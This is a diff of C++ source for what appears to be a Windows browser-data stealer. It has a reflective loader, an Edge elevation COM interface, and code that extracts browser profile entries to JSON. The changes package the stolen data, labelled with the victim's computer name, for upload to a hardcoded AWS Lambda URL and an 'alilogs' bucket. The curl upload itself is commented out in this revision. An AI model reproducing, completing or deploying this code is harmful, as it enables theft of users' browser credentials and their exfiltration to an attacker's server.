@@ -28,7 +28,6 @@
 
 #include "reflective_loader.h"
 #include "sqlite3.h"
-#include <curl/curl.h>
 
 #pragma comment(lib, "Crypt32.lib")
 #pragma comment(lib, "bcrypt.lib")
@@ -77,7 +76,47 @@ IEdgeElevatorFinal : public IEdgeIntermediateElevator{};
 
 namespace Payload
 {
-    class PipeLogger;
+    class PipeLogger
+    {
+    public:
+        PipeLogger(LPCWSTR pipeName)
+        {
+            m_pipe = CreateFileW(pipeName, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+        }
+
+        // A destructor called when the pipe goes out of scope.
+        ~PipeLogger()
+        {
+            if (m_pipe != INVALID_HANDLE_VALUE)
+            {
+                Log("__DLL_PIPE_COMPLETION_SIGNAL__");
+                FlushFileBuffers(m_pipe);
+                CloseHandle(m_pipe);
+            }
+        }
+
+        bool isValid() const
+        {
+            return m_pipe != INVALID_HANDLE_VALUE;
+        }
+
+        void Log(const std::string &message)
+        {
+            if (isValid())
+            {
+                DWORD bytesWritten = 0;
+                WriteFile(m_pipe, message.c_str(), static_cast<DWORD>(message.length() + 1), &bytesWritten, nullptr);
+            }
+        }
+
+        HANDLE getHandle() const
+        {
+            return m_pipe;
+        }
+
+    private:
+        HANDLE m_pipe = INVALID_HANDLE_VALUE;
+    };
 
     namespace Utils
     {
@@ -156,41 +195,50 @@ namespace Payload
         }
 
         void SendToLambda(const std::string& lambdaUrl,
-                          const std::string& jsonData,
-                          const std::string& bucket,
-                          const std::string& dir,
-                          const std::string& fileName)
+                      const std::string& payload,
+                       Payload::PipeLogger logger)   // <-- remove const
         {
-            CURL* curl = curl_easy_init();
-            if (!curl) return;
+            // CURLcode g = curl_global_init(CURL_GLOBAL_DEFAULT);
+            // if (g != CURLE_OK) {
+            //     logger.Log(std::string("curl_global_init failed: "));
+            // }
 
-            // Build JSON payload for Lambda
-            std::ostringstream payload;
-            payload << "{"
-                    << "\"bucket\":\"" << bucket << "\","
-                    << "\"dir\":\"" << dir << "\","
-                    << "\"fileName\":\"" << fileName << "\","
-                    << "\"fileBody\":" << jsonData
-                    << "}";
+            // CURL* curl = curl_easy_init();
+            // if (!curl) return;
 
-            std::string payloadStr = payload.str();
+            // struct curl_slist* headers = nullptr;
+            // headers = curl_slist_append(headers, "Content-Type: application/json");
 
-            struct curl_slist* headers = nullptr;
-            headers = curl_slist_append(headers, "Content-Type: application/json");
+            // curl_easy_setopt(curl, CURLOPT_URL, lambdaUrl.c_str());
+            // curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
+            // curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
 
-            curl_easy_setopt(curl, CURLOPT_URL, lambdaUrl);
-            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payloadStr.c_str());
-            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+            // CURLcode res = curl_easy_perform(curl);
+            // if (res != CURLE_OK) {
+            //     // curl_easy_strerror(res)
+            //     logger.Log("logging from Send");
+ 
+            // }
 
-            CURLcode res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
-            }
-
-            curl_slist_free_all(headers);
-            curl_easy_cleanup(curl);
+            // curl_slist_free_all(headers);
+            // curl_easy_cleanup(curl);
         }
+
+    std::string GetComputerNameString() {
+        wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1];
+        DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
+
+        if (GetComputerNameW(buffer, &size)) {
+            // Convert UTF-16 → UTF-8
+            int utf8Size = WideCharToMultiByte(CP_UTF8, 0, buffer, size, nullptr, 0, nullptr, nullptr);
+            std::string result(utf8Size, 0);
+            WideCharToMultiByte(CP_UTF8, 0, buffer, size, &result[0], utf8Size, nullptr, nullptr);
+            return result;
+        }
+        return {};
     }
+
+}
 
     namespace Browser
     {
@@ -441,47 +489,7 @@ namespace Payload
         }
     }
 
-    class PipeLogger
-    {
-    public:
-        PipeLogger(LPCWSTR pipeName)
-        {
-            m_pipe = CreateFileW(pipeName, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
-        }
-
-        // A destructor called when the pipe goes out of scope.
-        ~PipeLogger()
-        {
-            if (m_pipe != INVALID_HANDLE_VALUE)
-            {
-                Log("__DLL_PIPE_COMPLETION_SIGNAL__");
-                FlushFileBuffers(m_pipe);
-                CloseHandle(m_pipe);
-            }
-        }
-
-        bool isValid() const
-        {
-            return m_pipe != INVALID_HANDLE_VALUE;
-        }
-
-        void Log(const std::string &message)
-        {
-            if (isValid())
-            {
-                DWORD bytesWritten = 0;
-                WriteFile(m_pipe, message.c_str(), static_cast<DWORD>(message.length() + 1), &bytesWritten, nullptr);
-            }
-        }
-
-        HANDLE getHandle() const
-        {
-            return m_pipe;
-        }
-
-    private:
-        HANDLE m_pipe = INVALID_HANDLE_VALUE;
-    };
+    
 
     class BrowserManager
     {
@@ -683,28 +691,44 @@ namespace Payload
             }
 
             if (!jsonEntries.empty())
-            {
-                fs::path outFilePath = m_baseOutputPath / m_browserName / m_profilePath.filename() / (m_config.outputFileName + ".json");
-                std::error_code ec;
-                fs::create_directories(outFilePath.parent_path(), ec);
-                if (ec)
-                {
-                    m_logger.Log("[-] Failed to create directory: " + outFilePath.parent_path().u8string());
-                    return;
-                }
+            {   
+                std::stringstream outFilePathStream;
+                outFilePathStream << Utils::GetComputerNameString() << "/" <<  m_browserName;
+                std::string outFileName = (m_config.outputFileName + ".json");
+                
+                std::string outFilePath = outFilePathStream.str();
+                m_logger.Log(outFilePath);
 
-                std::ofstream out(outFilePath, std::ios::trunc);
-                if (!out)
-                    return;
+                std::stringstream jsonStream;
 
-                out << "[\n";
+                jsonStream << "[\n";
                 for (size_t i = 0; i < jsonEntries.size(); ++i)
                 {
-                    out << jsonEntries[i] << (i == jsonEntries.size() - 1 ? "" : ",\n");
+                    jsonStream << jsonEntries[i] << (i == jsonEntries.size() - 1 ? "" : ",\n");
                 }
-                out << "\n]\n";
+                jsonStream << "\n]\n";
 
-                m_logger.Log("     [*] " + std::to_string(jsonEntries.size()) + " " + m_config.outputFileName + " extracted to " + outFilePath.u8string());
+                std::string jsonData = jsonStream.str();
+
+                // build payload for your Node Lambda (if your Lambda expects {bucket, dir, fileName, fileBody})
+                std::ostringstream payload;
+                payload << "{"
+                        << "\"bucket\":\"alilogs\","
+                        << "\"dir\":" << std::quoted(outFilePath) << ","
+                        << "\"fileName\":\"" << m_config.outputFileName << ".json\","
+                        // ensure JSON string is safe to embed; if json contains quotes/newlines you might want to escape or base64 encode it.
+                        << "\"fileBody\":" << std::quoted(jsonData) // requires <iomanip>, C++11; this will quote and escape the string
+                        << "}";
+
+               //  m_logger.Log(payload.str());
+
+                std::string lamdaURL = "https://qigbmwctxw77sxr5k6rr56j5ve0rvqqz.lambda-url.us-east-1.on.aws/";
+                std::string bucketName = "alilogs";
+
+                std::string respCode;
+
+                // Utils::SendToLambda(lamdaURL, payload.str(), m_logger);
+                m_logger.Log("does this log!!! and what happends");
             }
         }
 
